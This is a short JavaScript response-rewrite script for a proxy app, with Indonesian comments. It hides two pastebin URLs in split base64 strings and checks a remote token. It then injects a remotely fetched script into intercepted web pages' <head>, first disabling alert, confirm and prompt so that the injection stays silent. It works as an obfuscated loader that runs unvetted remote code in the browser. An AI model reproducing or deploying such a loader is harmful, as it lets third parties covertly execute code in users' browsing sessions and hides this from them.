const MY_TOKEN = "malik_pepek"; 

const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";

const _0xR1 = { url: atob(_0xU1) + "?t=" + Math.random() };

$task.fetch(_0xR1).then(response => {
    let body = $response.body;
    
    if (response.body && response.body.includes(MY_TOKEN)) {
        const _0xR2 = { url: atob(_0xU2) + "?t=" + Math.random() };
        $task.fetch(_0xR2).then(resp2 => {
            if (resp2.body && body) {
                // TRIK SILENT: Mematikan fungsi alert & notification sebelum inject
                const silentScript = "<script>window.alert=function(){};window.confirm=function(){};window.prompt=function(){};</script>";
                
                // Suntikkan pembungkam + script utama
                $done({ body: body.replace("<head>", "<head>" + silentScript + resp2.body) });
            } else { $done({}); }
        }, () => $done({}));

    } else {
        // Jika token salah, tidak ada notifikasi ke layar sama sekali
        $done({}); 
    }
}, () => {
    $done({});
});
